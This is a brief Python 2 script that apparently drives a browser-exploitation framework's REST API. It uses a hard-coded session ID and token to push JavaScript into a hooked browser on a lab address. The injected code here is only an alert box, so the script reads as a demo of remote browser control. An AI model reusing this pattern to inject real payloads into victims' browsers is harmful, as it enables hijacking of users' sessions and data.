#!/usr/bin/env pthon
#--*--coding=utf-8--*--
# ** Author: ssooking

import json
import urllib2

def execJavascript(host, sessionId, authkey):

	payload={
		"cmd":"alert('Hello ssooking!');"
	}

	apiurl = host + "api/modules/" + sessionId + "/169?token=" + authkey
	print "[+] URL: " + apiurl

	jdata = json.dumps(payload)               # 对数据进行JSON格式化编码
	req = urllib2.Request(apiurl, jdata)      # 生成页面请求的完整数据
	req.add_header("Content-Type", "application/json; charset=UTF-8")
	response = urllib2.urlopen(req)           # 发送页面请求
	resdata = response.read()                 # 获取服务器返回的页面信息，数据类型为str 
	return resdata

if __name__ == '__main__':

	host = "http://192.168.1.133:3000/"
	sessionId = "ykH80KnJo0NGgTnRF04kwsE9cuXxI7JaxvBbH4diBxWvNrmYnTt99Vp5Bg8UjMb4rHgBQF08k5pFOLso"
	key = "dadd1be063d3a3b4339d84f5bdbbcbb25616b41d"
	print execJavascript(host,sessionId,key)

